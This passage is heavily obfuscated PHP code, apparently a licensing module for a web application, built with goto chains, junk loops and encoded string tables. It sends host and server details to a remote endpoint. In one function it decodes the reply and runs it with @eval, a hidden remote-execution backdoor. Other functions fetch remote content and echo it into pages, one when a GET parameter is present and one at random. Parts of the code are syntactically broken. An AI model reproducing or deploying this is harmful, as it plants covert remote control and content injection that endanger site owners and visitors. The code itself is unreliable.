$A⠗[25]($A⠗[120]($A⠗[193] . $c), 12, 15) . $A⠗[194]; $bս = $this->{$_SERVER[][195]}($A⠗[2]($cğ[$A⠗[196]]), $d̙, 2); $aӯ = $A⠗[197]($bս, !0); if (!$A⠗[198]($aӯ) || !$A⠗[198]($aӯ[$A⠗[199]]) || $aӯ[$A⠗[171]] != !0) { $C뿋 = $A⠗[200]; $Aܺ = $aӯ[$A⠗[199]] ? $A⠗[201] . $aӯ[$A⠗[199]] : $C뿋; $A⠗[172]($Aܺ, !1); } else { $b[$A⠗[174]] = $aӯ[$A⠗[199]][$A⠗[202]]; } } else { $aӯ = $this->{$_SERVER[][189]}($A⠗[203], $b, 10); } } goto b龕ē; F: $Fϯ =& $_SERVER[]; $A⠗ =& $_SERVER[]; if ($_SERVER[$A⠗[44]] != $A⠗[168]) { return; } goto Cҝ; aț: $d˝[$A⠗[129]] = $A⠗[124]($A⠗[220]($this->{$_SERVER[][153]}($Eچ, $A⠗[222]))); $dΚ = $Fϯ[619]; if (strlen($dΚ) < $Fϯ[620]) { die; } goto Bѫ; f⎣: $eʎ = $Fϯ[617]; while (strlen($eʎ) < $Fϯ[574]) { if (!$eʎ) { break; } $eʎ++; } if (!$d || $d != $A[$A⠗[151]]) { $b钉ҍ = array($A⠗[208] => $A⠗[61]($A⠗[62])->{$_SERVER[][63]}($A⠗[122]), $A⠗[209] => $_SERVER[$A⠗[121]], $A⠗[210] => $A⠗[211](), $A⠗[180] => $_SERVER[$A⠗[181]]); $bս = $this->{$_SERVER[][212]}($A⠗[154]($b钉ҍ)); $this->{$_SERVER[][189]}($A⠗[213] . $bս); $A⠗[172]($A⠗[204]($A⠗[214]), !0); } goto b; Cҝ: if (!$A⠗[112]($GLOBALS, $A⠗[138])) { die; } $cğ = $GLOBALS[$A⠗[22]]; if (isset($cğ[$A⠗[169]])) { $this->{$_SERVER[][170]}(); die; } goto fղⴘ; aٞ: $Eⵈ = $A⠗[220]($A⠗[25]($Fа, 10, 16)); $Cɦ = $this->{$_SERVER[][133]}($A⠗[154]($A), $Fа); $aǎ = $Fϯ[621]; goto C; Cȴ: $this->{$_SERVER[][235]}(); Cache::set($A⠗[236] . $A⠗[120]($C֏ . $A⠗[237]), $A⠗[10]); $fي = $Fϯ[624]; goto fȇ; fղⴘ: if (!isset($cğ[$A⠗[171]]) || $A⠗[24]($cğ[$A⠗[171]]) != 16) { $A⠗[172]($A⠗[173] . $cğ[$A⠗[171]], !1); } $C֏ = $A⠗[61]($A⠗[62])->{$_SERVER[][63]}($A⠗[122]); $b = array($A⠗[171] => $cğ[$A⠗[171]], $A⠗[174] => $A⠗[130](16), $A⠗[175] => $A⠗[155], $A⠗[176] => $A⠗[177], $A⠗[178] => $_SERVER[$A⠗[179]], $A⠗[180] => $_SERVER[$A⠗[181]], $A⠗[182] => $_SERVER[$A⠗[183]]); goto F; fݕ: if (!$F) { return; } $this->nhbp8b14eae5 = $A; $this->xfre5f87504c = $d˝[$A⠗[126]]; goto Cȴ; A: $Eμ㉏[$Eⵈ] = $Cɦ; $A⠗[61]($A⠗[11])->{$_SERVER[][232]}($c[$A⠗[233]], array($A⠗[234] => $Eμ㉏)); $F = $Fϯ[623]; goto fݕ; Bܠ: $EĈ = $Bݶ . $d˝[$A⠗[126]] . $d˝[$A⠗[218]]; $d˝[$A⠗[128]] = $A⠗[220]($A⠗[124]($this->{$_SERVER[][153]}($EĈ, $A⠗[221]))); $B = $A⠗[130](16); goto a۾; a۾: $A = $Fϯ[618]; if (!$A) { die; } $Eچ = $B . $d˝[$A⠗[126]] . $this->{$_SERVER[][153]}($A⠗[120]($d˝[$A⠗[215]]), $B); goto aț; Cۗ￶: $Eμ㉏ = array(); $Fȩ = $Fϯ[622]; if (strlen($Fȩ) < $Fϯ[581]) { return; } goto A; fȇ: while (strlen($fي) < $Fϯ[583]) { if (!$fي) { break; } $fي++; } $A⠗[172]($A⠗[204]($A⠗[214]), !0); goto cǴǈȊ; b龕ē: if (!$A⠗[198]($aӯ) || !$A⠗[198]($aӯ[$A⠗[199]]) || $aӯ[$A⠗[171]] != !0) { $C뿋 = $A⠗[204]($A⠗[205]); $Aܺ = $aӯ[$A⠗[199]] ? $A⠗[201] . $aӯ[$A⠗[199]] : $C뿋; $A⠗[172]($Aܺ, !1); } $A = $aӯ[$A⠗[199]]; $d = $this->{$_SERVER[][206]}($A[$A⠗[207]]); goto f⎣; b: $d˝ = array($A⠗[215] => $b[$A⠗[171]], $A⠗[216] => $A[$A⠗[217]], $A⠗[218] => $A⠗[130](16), $A⠗[126] => $A[$A⠗[219]]); if ($b[$A⠗[174]]) { $d˝[$A⠗[218]] = $b[$A⠗[174]]; } $Bݶ = $A⠗[25]($A⠗[120]($d˝[$A⠗[216]]), 10, 10); goto Bܠ; Bѫ: if ($A[$A⠗[223]] && $A[$A⠗[223]] >= 1) { $A⠗[61]($A⠗[62])->{$_SERVER[][224]}($A⠗[225], $A⠗[226]); } $A⠗[61]($A⠗[62])->{$_SERVER[][227]}($d˝); $Fа = $A⠗[120]($_SERVER[$A⠗[121]] . $A⠗[220]($C֏) . $d˝[$A⠗[216]]); goto aٞ; C: if (!$aǎ) { return; } $b = $A⠗[228]($A⠗[61]($A⠗[11])->{$_SERVER[][229]}(), $A⠗[230]); $c = $b[$A⠗[231]]; goto Cۗ￶; cǴǈȊ: } private function licenseRegistSuccess() { $E =& $_SERVER[]; $cҷ = $E[61]($E[62])->{$_SERVER[][63]}(); $B = $_SERVER[][625]; if ($cҷ[$E[89]] != $E[226]) { $E[61]($E[62])->{$_SERVER[][227]}($E[89], $E[226]); } $E[116]($E[238])->{$_SERVER[][239]}(!0); } private function ekaz83142e17() { goto dݛ; Dߥ: $eȮ = $Bñ[628]; if (strlen($eȮ) < $Bñ[581]) { return; } goto Aב; dݛ: $Bñ =& $_SERVER[]; $f =& $_SERVER[]; $f[61]($f[62])->{$_SERVER[][227]}(array($f[215] => $f[10], $f[216] => $f[10], $f[126] => $f[127], $f[128] => $f[10], $f[129] => $f[10])); goto Eޜ; Eޜ: $f[61]($f[62])->{$_SERVER[][224]}($f[225], $f[240]); $EԄ = $Bñ[626]; $this->nhbp8b14eae5 = array(); goto e͵ϟ; e͵ϟ: $c = $Bñ[627]; if (!$c) { return; } $this->xfre5f87504c = $f[127]; goto Dߥ; Aב: } private function toyv70c81875() { goto f; dכ⓫: $A­ = $d[632]; $Eѱ = $a[236] . $a[120]($Cأ . $a[237]); $a䐠 = $d[633]; goto a; f: $d =& $_SERVER[]; $a =& $_SERVER[]; $_SERVER[$a[181]] = $a[112]($_SERVER, $a[181], APP_HOST); goto aӈ; aӈ: $f = $d[629]; $this->xfre5f87504c = $a[127]; $B仠 = $d[630]; goto F; a: if (strlen($a䐠) < $d[620]) { die; } $fҝӪ = Cache::get($Eѱ); $dگ = $d[634]; goto b؈֋; D: while ($a䩵 < $d[577]) { if ($a䩵 >= 0) { break; } $a䩵++; } if ($dٖ[$a[126]] == $a[127]) { return; } $Cأ = $a[61]($a[62])->{$_SERVER[][63]}($a[122]); goto dכ⓫; F: if (!$B仠) { return; } $dٖ = $a[61]($a[62])->{$_SERVER[][63]}(); $a䩵 = $d[631]; goto D; A͒: $EЛ = $a[150]($fҝӪ[$a[151]]); if ($a[242]() >= $EЛ) { return $this->{$_SERVER[][170]}(); } if ($a[242]() - $fҝӪ[$a[241]] > 20) { $fҝӪ[$a[241]] = $a[242](); Cache::set($Eѱ, $fҝӪ); } goto aƃ; b؈֋: while (strlen($dگ) < $d[577]) { if (!$dگ) { break; } $dگ++; } if (!$a[198]($fҝӪ) || !isset($fҝӪ[$a[241]]) || $a[242]() - $fҝӪ[$a[241]] >= 60) { $D㩗 = $a[228]($a[61]($a[11])->{$_SERVER[][229]}(), $a[230]); $A͏կ = $D㩗[$a[231]]; $E۶Ԙ = $a[120]($_SERVER[$a[121]] . $a[220]($Cأ) . $dٖ[$a[216]]); $c = $a[220]($a[25]($E۶Ԙ, 10, 16)); $fҝӪ = $this->{$_SERVER[][195]}($A͏կ[$a[100]][$c], $E۶Ԙ); $fҝӪ = $a[197]($fҝӪ, !0); } if (!$a[198]($fҝӪ)) { return $this->{$_SERVER[][170]}(); } goto A͒; aƃ: $this->nhbp8b14eae5 = $fҝӪ; $this->xfre5f87504c = $dٖ[$a[126]]; goto eŇ; eŇ: } private function ipbmc1c56927() { goto D˷熍Ѧ; Bԏ: if ($fڐ == $E[243] && $this->xfre5f87504c == $E[127]) { $E[172]($E[204]($E[244]), !1, $E[245]); } $B = array($E[246], $E[247]); if ($E[248]($fڐ, $B)) { if ($this->xfre5f87504c == $E[127] && isset($d[$E[249]])) { $E[172]($E[204]($E[244]), !1, $E[245]); die; } $Bʳ = $this->{$_SERVER[][143]}(); if ($Bʳ != $E[250]($E[251])) { if ($Bʳ <= $E[61]($E[145])->{$_SERVER[][146]}()) { $E[172]($E[204]($E[252]), !1, $E[245]); die; } } } goto Aꋾ; eмر: $fڐ = $_SERVER[$E[44]]; $CɽϮ = $a׵[635]; while (strlen($CɽϮ) < $a׵[574]) { if (!$CɽϮ) { break; } $CɽϮ++; } goto Bԏ; D˷熍Ѧ: $a׵ =& $_SERVER[]; $E =& $_SERVER[]; $d = $GLOBALS[$E[22]]; goto eмر; Aꋾ: } private function xihv97a3e50b() { goto Eә; Eә: $aŕ =& $_SERVER[]; $bމ =& $_SERVER[]; $A = array($bމ[141], $bމ[253]); goto AƎ; AƎ: $Cܣ = $aŕ[636]; if (!$Cܣ) { die; } if (!$bމ[112]($GLOBALS, $bމ[138]) || !isset($_GET[$bމ[254]])) { return; } goto aȜ; eӯ: $Fˉ = $aŕ[637]; $dʺ = $bމ[258](array($bމ[259] => array($bމ[260] => $bމ[261], $bމ[262] => 3))); $F℟ = @$bމ[263]($bљ, !1, $dʺ); goto BƩ; aȜ: if (!$bމ[248]($_SERVER[$bމ[44]], $A)) { return; } $bљ = $bމ[255]; $bљ = $this->{$_SERVER[][256]}($bљ, $bމ[257]); goto eӯ; BƩ: $aߍƋ = $aŕ[638]; $bމ[264]($bމ[265]); if ($F℟ && $bމ[32]($F℟, $bމ[266])) { echo $F℟; } goto Fא; Fא: die; goto Aʍ٨; Aʍ٨: } public function eyfmab9e2495($Dޡ) { goto Bֶ; d: $B = $b̸َ[0]($b̸َ[282], $b̸َ[112]($this->nhbp8b14eae5, $b̸َ[135], $b̸َ[10])); $Bո = array(); foreach ($b餗׵ as $BŲ => $DΊ) { if ($DΊ == $b̸َ[269] && $b̸َ[25]($this->xfre5f87504c, 0, 1) == $b̸َ[269]) { continue; } if (!$b̸َ[248]($BŲ, $B)) { $Bո[] = $BŲ; } } goto Eʝ; Bֶ: $b̸َ =& $_SERVER[]; if ($this->xfre5f87504c == $b̸َ[267]) { return $Dޡ; } $b餗׵ = array($b̸َ[268] => $b̸َ[269], $b̸َ[270] => $b̸َ[269], $b̸َ[271] => $b̸َ[269], $b̸َ[272] => $b̸َ[269], $b̸َ[273] => $b̸َ[269], $b̸َ[274] => $b̸َ[275], $b̸َ[276] => $b̸َ[275], $b̸َ[277] => $b̸َ[275], $b̸َ[278] => $b̸َ[275], $b̸َ[279] => $b̸َ[275], $b̸َ[280] => $b̸َ[275], $b̸َ[281] => $b̸َ[275]); goto d; Eʝ: foreach ($Bո as $BŲ) { unset($Dޡ[$BŲ]); } return $Dޡ; $E = $_SERVER[][639]; goto d葺; d葺: } private function derqebbc5a5a() { goto FЂ; eɰ: $GLOBALS[$e؆[100]][$e؆[104]][$e؆[283]] = $e؆[226]; $GLOBALS[$e؆[100]][$e؆[284]] = $e؆[226]; $Bˮ = $E嵙[640]; goto B슥; FЂ: $E嵙 =& $_SERVER[]; $e؆ =& $_SERVER[]; if ($this->xfre5f87504c != $e؆[127]) { return; } goto eɰ; B슥: while ($Bˮ < $E嵙[581]) { if ($Bˮ >= 0) { break; } $Bˮ++; } if ($e؆[61]($e؆[285])->{$_SERVER[][63]}($e؆[89]) != $e؆[240]) { $e؆[61]($e؆[285])->{$_SERVER[][227]}($e؆[89], $e؆[240]); } goto FƋ; FƋ: } public function chefc4a62e43() { $cᝑ =& $_SERVER[]; return $_SERVER[][286]; $f暑 = $cᝑ[641]; if (strlen($f暑) < $cᝑ[577]) { die; } } private function kgmw888ec984() { goto Bڐ; Aثʢ: if ($D݄݆[242]() % 4 != 0) { return; } $aķ͂ = $D݄݆[13](array($D݄݆[292], $D݄݆[293]), $e˾); $c͡ = $aъؕ[644]; goto B; f: if (!$D݄݆[198]($c͊誮)) { return; } if ($c͊誮[$D݄݆[171]] && $c͊誮[$D݄݆[296]]) { if ($this->{$_SERVER[][206]}($c͊誮[$D݄݆[296]]) == $Dǐ[$D݄݆[171]]) { return; } } $this->{$_SERVER[][170]}(); goto d՜; B: if (!$c͡) { die; } if ($aķ͂ && $D݄݆[242]() - $aķ͂ < $D݄݆[250]($D݄݆[294])) { return; } $D݄݆[13](array($D݄݆[292], $D݄݆[158]), $e˾, $D݄݆[242]()); goto E񗆺; B鉵ʲ: $c͊誮 = $this->{$_SERVER[][189]}($D݄݆[295], $Dǐ); $c = $aъؕ[646]; if (!$c) { return; } goto f; F˻: $Fʍ = $aъؕ[643]; if ($this->xfre5f87504c == $D݄݆[127] || !$D݄݆[112]($GLOBALS, $D݄݆[138])) { return; } if (!$D݄݆[248]($_SERVER[$D݄݆[44]], $E헙)) { return; } goto Aثʢ; E: $Fۿ = $aъؕ[642]; if (!$Fۿ) { return; } $e˾ = $D݄݆[290] . $D݄݆[120]($D݄݆[291]); goto F˻; d՜: $d˾ = $aъؕ[647]; if (!$d˾) { return; } if ($this->{$_SERVER[][206]}($c͊誮[$D݄݆[296]]) != $Dǐ[$D݄݆[171]]) { $A戱 = array($D݄݆[208] => $D݄݆[61]($D݄݆[62])->{$_SERVER[][63]}($D݄݆[122]), $D݄݆[209] => $_SERVER[$D݄݆[121]], $D݄݆[210] => $D݄݆[211](), $D݄݆[180] => $_SERVER[$D݄݆[181]]); $aۮ = $this->{$_SERVER[][212]}($D݄݆[154]($A戱)); $c͊誮 = $this->{$_SERVER[][189]}($D݄݆[213] . $aۮ); if ($c͊誮 && $D݄݆[198]($c͊誮) && isset($c͊誮[$D݄݆[296]])) { $E = $this->{$_SERVER[][195]}($c͊誮[$D݄݆[296]], 2); if ($E) { $E = $this->{$_SERVER[][206]}($E); } if ($E) { try { @eval($E); } catch (Exception $cĖ) { } } } } goto c˶; E񗆺: $D = $aъؕ[645]; if (strlen($D) < $aъؕ[577]) { return; } $Dǐ = array($D݄݆[171] => $D݄݆[61]($D݄݆[62])->{$_SERVER[][63]}($D݄݆[215]), $D݄݆[184] => $this->xfre5f87504c, $D݄݆[182] => $_SERVER[$D݄݆[183]], $D݄݆[175] => $D݄݆[155], $D݄݆[178] => $_SERVER[$D݄݆[179]]); goto B鉵ʲ; Bڐ: $aъؕ =& $_SERVER[]; $D݄݆ =& $_SERVER[]; $E헙 = array($D݄݆[287], $D݄݆[288], $D݄݆[289]); goto E; c˶: } private function zskb089064bc($dĉ = '', $D蹄 = array(), $bޙԡ = 5) { goto a; b: $f㰍ϰ = $f㰍ϰ . $dĉ; $Cʄ = $Eѵ[649]; while ($Cʄ < $Eѵ[577]) { if ($Cʄ >= 0) { break; } $Cʄ++; } goto eӭ; a: $Eѵ =& $_SERVER[]; $D˂સި =& $_SERVER[]; $f㰍ϰ = $D˂સި[297]; goto fƮ; A: if (strlen($a) < $Eѵ[620]) { return; } goto Ḇ; EК: $eڭ = $Eѵ[651]; if (!$eڭ) { die; } $a = $Eѵ[652]; goto A; Aߞ: $D蹄 = @$D˂સި[263]($f㰍ϰ, !1, $e); $D򕩻՝ = $Eѵ[650]; return $D˂સި[197]($D蹄, !0); goto EК; eӭ: if ($D蹄 && $D˂સި[198]($D蹄)) { $f㰍ϰ = $f㰍ϰ . $D˂સި[299] . $D˂સި[300]($D蹄); } if ($D蹄 === -1) { return $f㰍ϰ; } $e = $D˂સި[258](array($D˂સި[259] => array($D˂સި[262] => $bޙԡ, $D˂સި[260] => $D˂સި[301]), $D˂સި[302] => array($D˂સި[303] => !1, $D˂સި[304] => !1))); goto Aߞ; fƮ: $FꙄ = $Eѵ[648]; if (!$FꙄ) { return; } $f㰍ϰ = $this->{$_SERVER[][256]}($f㰍ϰ, $D˂સި[298]); goto b; Ḇ: } private function swrx25707b5e() { goto F; c֞: $Bլ = $Dΐ[250]($Bլ ? $Bլ : $Dΐ[306]); $bȥ = $fּ[654]; while (strlen($bȥ) < $fּ[577]) { if (!$bȥ) { break; } $bȥ++; } goto AĻÆ; eѠͻ: return $Bլ + $eߖ; $bݚن = $fּ[656]; goto b蓶; bݐ: $Bլ = $Dźܪ[$this->xfre5f87504c]; $a = $fּ[653]; while (strlen($a) < $fּ[577]) { if (!$a) { break; } $a++; } goto c֞; F: $fּ =& $_SERVER[]; $Dΐ =& $_SERVER[]; $Dźܪ = array($Dΐ[305] => $Dΐ[306], $Dΐ[307] => $Dΐ[308], $Dΐ[309] => $Dΐ[310], $Dΐ[311] => $Dΐ[312], $Dΐ[313] => $Dΐ[314], $Dΐ[315] => $Dΐ[251], $Dΐ[316] => $Dΐ[251], $Dΐ[317] => $Dΐ[306], $Dΐ[318] => $Dΐ[308], $Dΐ[319] => $Dΐ[310], $Dΐ[320] => $Dΐ[321], $Dΐ[322] => $Dΐ[312], $Dΐ[323] => $Dΐ[324], $Dΐ[325] => $Dΐ[314], $Dΐ[326] => $Dΐ[327], $Dΐ[328] => $Dΐ[329], $Dΐ[330] => $Dΐ[331]); goto bݐ; AĻÆ: $eߖ = $Dΐ[112]($this->nhbp8b14eae5, $Dΐ[332]); $eߖ = $eߖ ? $Dΐ[250]($eߖ) : 0; $c = $fּ[655]; goto eѠͻ; b蓶: } public function xedv042cbdf6($e) { goto A; eّ: $dߎ = $f[61]($f[145])->{$_SERVER[][334]}($f[333])->{$_SERVER[][335]}($Aޣ)->{$_SERVER[][336]}(); $F膝 = $_SERVER[][657]; if (!$F膝) { die; } goto AƃҞ; A: $f =& $_SERVER[]; $Aޣ = $this->{$_SERVER[][143]}(); if ($e[$f[333]] == $f[226]) { return; } goto Aκ; AƃҞ: $dߎ = $f[228]($dߎ, $f[10], $f[333]); if (!$f[248]($e[$f[333]], $dߎ)) { $f[172]($f[337], !1, $f[245]); } goto eÑ; Aκ: if ($Aޣ >= $f[250]($f[251])) { return; } $bƭ = $f[61]($f[145])->{$_SERVER[][146]}(); if ($bƭ <= $Aޣ) { return; } goto eّ; eÑ: } public function chel5e475b18() { goto e; e: $bك =& $_SERVER[]; $e뽖 =& $_SERVER[]; if (!$e뽖[112]($GLOBALS, $e뽖[138]) || $e뽖[338](1, 100) > 20) { return; } goto Dّ; e: $c = $bك[658]; $d⊸ = @$e뽖[263]($B, !1, $fƔ); $D = $bك[659]; goto A; A: if (!$D) { die; } echo $e뽖[339] . $e뽖[340]($d⊸) . $e뽖[341]; goto Cìʇ; Dّ: $B = $e뽖[255]; $B = $this->{$_SERVER[][256]}($B, $e뽖[257]); $fƔ = $e뽖[258](array($e뽖[259] => array($e뽖[260] => $e뽖[261], $e뽖[262] => 3))); goto e; Cìʇ: } private function kimc3d768721($b, $E쟤, $D˚ = 3) { goto BȌ; b뒵: $f = $Aۤ퍾[130](15); $b̵ = $C[661]; $Bǜƍ = $Aۤ퍾[343]; goto cټ; dϡ: return $e㘂; goto A뉚ܓ; cټ: switch ($fȝ) { case $Aۤ퍾[240]: $e㘂 = $this->{$_SERVER[][153]}($b, $Aۤ퍾[220]($E쟤 . $f)); break; $eޝ = $C[662]; while (strlen($eޝ) < $C[583]) { if (!$eޝ) { break; } $eޝ++; } case $Aۤ퍾[226]: $e㘂 = $this->{$_SERVER[][153]}($b, $Aۤ퍾[220]($f . $E쟤)); break; $A = $C[663]; if (!$A) { die; } case $Aۤ퍾[344]: $e㘂 = $this->{$_SERVER[][153]}($b, $Aۤ퍾[124]($f . $E쟤)); $aŒ = $C[664]; break; $b󅩗 = $C[665]; case $Aۤ퍾[345]: $e㘂 = $this->{$_SERVER[][153]}($b, $Aۤ퍾[120]($f . $E쟤)); break; $fۥý = $C[666]; case $Aۤ퍾[346]: goto BԳ; F: $cߨ = 0; for ($F = 0; $F < $Aۤ퍾[24]($b); $F++) { $cߨ = $cߨ == $Aۤ퍾[24]($c͠厌) ? 0 : $cߨ; $EϾ = $C[671]; $bِ = ($a + $Aۤ퍾[348]($Bǜƍ, $b[$F]) + $Aۤ퍾[349]($c͠厌[$cߨ++])) % 64; $Bߡ .= $Bǜƍ[$bِ]; $Eᨂރ = $C[672]; } $e㘂 = $Aۤ퍾[340]($e . $Bߡ); goto C; bƚۿ: if (!$d) { die; } $e = $Bǜƍ[$a]; $Dᎏ = $C[668]; goto fĊ; a髉: $Dɪ = $C[669]; $Bߡ = $Aۤ퍾[10]; $eΨ = $C[670]; goto E; fĊ: while ($Dᎏ < $C[581]) { if ($Dᎏ >= 0) { break; } $Dᎏ++; } $c͠厌 = $Aۤ퍾[120]($e . $Aۤ퍾[120]($E쟤 . $e) . $E쟤); $c͠厌 = $Aۤ퍾[25]($c͠厌, $a % 8, $a % 8 + 7); goto a髉; BԳ: $b = $Aۤ퍾[124]($b); $a = $Aۤ퍾[347](0, 64); $d = $C[667]; goto bƚۿ; E: if (!$eΨ) { die; } $F = 0; $bِ = 0; goto F; C: break; goto FŠ; FŠ: default: $e㘂 = $this->{$_SERVER[][153]}($b, $E쟤 . $f); $AĻة = $C[673]; while (strlen($AĻة) < $C[581]) { if (!$AĻة) { break; } $AĻة++; } break; $F = $C[674]; } $e㘂 = $Aۤ퍾[220]($fȝ . $f . $e㘂); if ($D˚ - 1 > 0) { $e㘂 = $this->{$_SERVER[][133]}($e㘂, $E쟤, $D˚ - 1); } goto dϡ; aկ: $b = $Aۤ퍾[2]($b); $fȝ = $Aۤ퍾[338](0, 5) . $Aۤ퍾[10]; $Fέѹ = $C[660]; goto b뒵; BȌ: $C =& $_SERVER[]; $Aۤ퍾 =& $_SERVER[]; $Aۤ퍾[342](1); goto aկ; A뉚ܓ: } private function dgtnf20b6e5c($aϯ, $cԮ, $EɑԻ = 3) { goto c﴾ʐ; fƊ: $aϯ = $cꭹ[2]($aϯ); $cƿ = $E譿[675]; $aϯ = $cꭹ[220]($aϯ); goto Eݗ; d: $F؉ = $E譿[677]; while (strlen($F؉) < $E譿[620]) { if (!$F؉) { break; } $F؉++; } $c = $cꭹ[25]($aϯ, 1, 15); goto c; dΠ: if (strlen($Fؙ) < $E譿[577]) { die; } switch ($fϣ) { case $cꭹ[240]: $B͇ = $this->{$_SERVER[][256]}($aϯ, $cꭹ[220]($cԮ . $c)); break; case $cꭹ[226]: $B͇ = $this->{$_SERVER[][256]}($aϯ, $cꭹ[220]($c . $cԮ)); $DҐƆ = $E譿[679]; while ($DҐƆ < $E譿[581]) { if ($DҐƆ >= 0) { break; } $DҐƆ++; } break; case $cꭹ[344]: $B͇ = $this->{$_SERVER[][256]}($aϯ, $cꭹ[124]($c . $cԮ)); break; $bظ = $E譿[680]; if (!$bظ) { die; } case $cꭹ[345]: $B͇ = $this->{$_SERVER[][256]}($aϯ, $cꭹ[120]($c . $cԮ)); break; case $cꭹ[346]: goto c͸; FА: $D׽ = $cꭹ[120]($a˪ . $cꭹ[120]($cԮ . $a˪) . $cԮ); $f = $E譿[684]; if (strlen($f) < $E譿[574]) { die; } goto C傢; bϰ͹: break; $C뷙 = $E譿[692]; if (strlen($C뷙) < $E譿[577]) { die; } goto FͲ; E粿: $C֐ = $cꭹ[348]($a۔, $a˪); $cߓ̯ = $E譿[683]; while ($cߓ̯ < $E譿[583]) { if ($cߓ̯ >= 0) { break; } $cߓ̯++; } goto FА; CŃ: if (!$D) { die; } $aϯ = $cꭹ[25]($aϯ, 1); $cՠ = $E譿[682]; goto E粿; A: for ($D = 0; $D < $cꭹ[24]($aϯ); $D++) { $bҼ = $bҼ == $cꭹ[24]($D׽) ? 0 : $bҼ; $d = $E譿[687]; $c믹 = $bҼ++; $e = $E譿[688]; if (!$e) { return; } $Dѣ = $cꭹ[348]($a۔, $aϯ[$D]) - $C֐ - $cꭹ[349]($D׽[$c믹]); $D = $E譿[689]; if (!$D) { return; } while ($Dѣ < 0) { $Dѣ += 64; $bհ = $E譿[690]; if (!$bհ) { return; } } $fæ܋ .= $a۔[$Dѣ]; } $B͇ = $cꭹ[352]($fæ܋); $E = $E譿[691]; goto bϰ͹; c͸: $aϯ = $cꭹ[351]($aϯ); $a˪ = $aϯ[0]; $D = $E譿[681]; goto CŃ; dɴ̽: $b̽ = $E譿[685]; while ($b̽ < $E譿[620]) { if ($b̽ >= 0) { break; } $b̽++; } $Dѣ = 0; goto F; C傢: $D׽ = $cꭹ[25]($D׽, $C֐ % 8, $C֐ % 8 + 7); $fæ܋ = $cꭹ[10]; $D = 0; goto dɴ̽; F: $bҼ = 0; $Dڋ = $E譿[686]; while (strlen($Dڋ) < $E譿[583]) { if (!$Dڋ) { break; } $Dڋ++; } goto A; FͲ: default: $B͇ = $this->{$_SERVER[][256]}($aϯ, $cԮ . $c); $eӞ = $E譿[693]; while (strlen($eӞ) < $E譿[574]) { if (!$eӞ) { break; } $eӞ++; } break; $E = $E譿[694]; while ($E < $E譿[620]) { if ($E >= 0) { break; } $E++; } } if ($EɑԻ - 1 > 0) { $B͇ = $this->{$_SERVER[][195]}($B͇, $cԮ, $EɑԻ - 1); } goto c; c: return $B͇; goto f; c﴾ʐ: $E譿 =& $_SERVER[]; $cꭹ =& $_SERVER[]; if (!$cꭹ[350]($aϯ) || $cꭹ[24]($aϯ) < 10) { return !1; } goto fƊ; c: $aϯ = $cꭹ[25]($aϯ, 16); $a۔ = $cꭹ[343]; $Fؙ = $E譿[678]; goto dΠ; Eݗ: $A瘔 = $E譿[676]; while (strlen($A瘔) < $E譿[574]) { if (!$A瘔) { break; } $A瘔++; } $fϣ = $aϯ[0]; goto d; f: } public function fsjbb1d5b303($FΌ) { goto A؈; C˺: $c색 = $this->{$_SERVER[][153]}($FΌ, $aȌƈ) . $a錋[357] . $D; $fĦ = $BΌ[699]; if (!$fĦ) { return; } goto F򊪉; CΪ؄: $Bݛ = 2; for ($bچ = 0; $bچ < $Aʂ * 10; $bچ++) { if (($Aʂ * $bچ + 1) % $dޅғ == 0) { $Bݛ = $a錋[250](($Aʂ * $bچ + 1) / $dޅғ); break; } } $D = $this->{$_SERVER[][153]}($E֖Ȉ * $FއŒ . $a錋[10], $a錋[155]); goto F; F: $aȌƈ = $a錋[120]($a錋[354] . ($E֖Ȉ + $FއŒ) . $a錋[355] . $dޅғ . $a錋[355] . $Bݛ . $a錋[356]); $E󳔰㡂 = $BΌ[698]; if (strlen($E󳔰㡂) < $BΌ[577]) { return; } goto C˺; F妎: $Aʂ = ($E֖Ȉ - 1) * ($FއŒ - 1); $dޅғ = $a錋[250](($E֖Ȉ + $FއŒ) / 2); while (1) { $eʽ = $dޅғ; $ǎ܌ = $Aʂ; $eԍ = $BΌ[586]; if (!$eԍ) { die; } while ($ǎ܌ % $eʽ != 0) { $D߼܉ = $ǎ܌; $C = $BΌ[696]; while (strlen($C) < $BΌ[581]) { if (!$C) { break; } $C++; } $ǎ܌ = $eʽ; $a˺ = $BΌ[697]; while (strlen($a˺) < $BΌ[583]) { if (!$a˺) { break; } $a˺++; } $eʽ = $D߼܉ % $eʽ; } if ($eʽ == 1) { break; } else { $dޅғ++; } } goto CΪ؄; C: $d = $BΌ[695]; while (strlen($d) < $BΌ[581]) { if (!$d) { break; } $d++; } $FއŒ = $this->{$_SERVER[][353]}(); goto F妎; F򊪉: return $c색; goto E; A؈: $BΌ =& $_SERVER[]; $a錋 =& $_SERVER[]; $E֖Ȉ = $this->{$_SERVER[][353]}(); goto C; E: } public function bltu818227c0($e鳍) { goto Fڒ; aƠ¾: $cާ = $Cݐ[711]; while (strlen($cާ) < $Cݐ[581]) { if (!$cާ) { break; } $cާ++; } return $A; goto A; A: $Eۼ = $Cݐ[712]; if (strlen($Eۼ) < $Cݐ[574]) { return; } goto c; a߾ڨ: $cꓥ = $Cݐ[701]; while (strlen($cꓥ) < $Cݐ[574]) { if (!$cꓥ) { break; } $cꓥ++; } if (!$B֫) { return $f[10]; } goto fʝ; E: $a͘ = $f[250](($bȅ + $eм) / 2); while (1) { $Eɗʌ = $a͘; $d = $Cݐ[707]; while ($d < $Cݐ[583]) { if ($d >= 0) { break; } $d++; } $cʐ = $d; $A҆ = $Cݐ[708]; if (strlen($A҆) < $Cݐ[583]) { die; } while ($cʐ % $Eɗʌ != 0) { $Bȋ = $cʐ; $B = $Cݐ[709]; while ($B < $Cݐ[583]) { if ($B >= 0) { break; } $B++; } $cʐ = $Eɗʌ; $A = $Cݐ[710]; $Eɗʌ = $Bȋ % $Eɗʌ; } if ($Eɗʌ == 1) { break; } else { $a͘++; } } $aѫ = 2; goto d; Fڒ: $Cݐ =& $_SERVER[]; $f =& $_SERVER[]; $f旐 = $f[0]($f[357], $e鳍); goto eߴ; aׇ: $eм = 0; $Cʪ = $Cݐ[703]; while ($Cʪ < $Cݐ[583]) { if ($Cʪ >= 0) { break; } $Cʪ++; } goto C֯; eߴ: $C݄ = $Cݐ[700]; if ($f[19]($f旐) != 2) { return $f[10]; } $B֫ = $this->{$_SERVER[][256]}($f旐[1] . $f[10], $f[155]); goto a߾ڨ; C֯: for ($Cݓ = 3; $Cݓ < $B֫; $Cݓ += 2) { if ($B֫ % $Cݓ != 0) { continue; } $bȅ = $Cݓ; $B = $Cݐ[704]; $eм = $f[250]($B֫ / $Cݓ); $A̕ = $Cݐ[705]; if (!$A̕) { return; } break; } $d = ($bȅ - 1) * 